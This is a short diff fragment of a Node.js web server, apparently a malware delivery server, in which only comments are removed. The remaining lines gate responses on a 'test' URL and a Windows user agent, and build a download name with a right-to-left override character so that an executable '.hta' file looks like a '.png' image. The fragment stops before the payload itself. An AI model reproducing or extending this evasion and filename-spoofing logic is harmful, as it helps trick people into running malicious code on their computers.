@@ -4,20 +4,15 @@ h.createServer((q, r) => {
     try {
         const u = q.url;
         const a = q.headers['user-agent'] || '';
-
-        // 1. Keep-Awake Route
         if (u === '/ping') {
             r.writeHead(200);
             r.end('1');
             return;
         }
-
-        // 2. Safety Gate
         if (!u.includes('test')) {
             r.end();
             return;
         }
-
         if (a.includes('Windows')) {
             const f = "Update_" + String.fromCharCode(0x202E) + "gnp.hta";
             
